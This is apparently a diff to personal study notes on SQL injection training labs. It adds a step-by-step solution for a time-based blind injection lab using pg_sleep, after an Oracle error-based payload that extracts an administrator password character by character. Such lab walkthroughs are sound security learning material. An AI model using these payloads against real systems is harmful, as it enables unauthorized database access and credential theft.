@@ -201,5 +201,13 @@ Theory:-  Error-based SQL injection refers to cases where you're able to use err
     password length is 20 cus after that response is coming 200
     7. ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users where username='administrator' and substr(password,1,1)='a')  || '
     and keep swtiching position and perform $a$ and in (1,1) keep changing the first 1 value till 20 until we recover full password length.
+    8. Lab is solved
+
+------------------------------------------------------------------------------------------
+
+#11 Lab: Blind SQL injection with time delays
+
+    1. trackingid=xyz'||pg_sleep(10)-- (see response time for delay)
+    2. Lab is solved
 
 ------------------------------------------------------------------------------------------
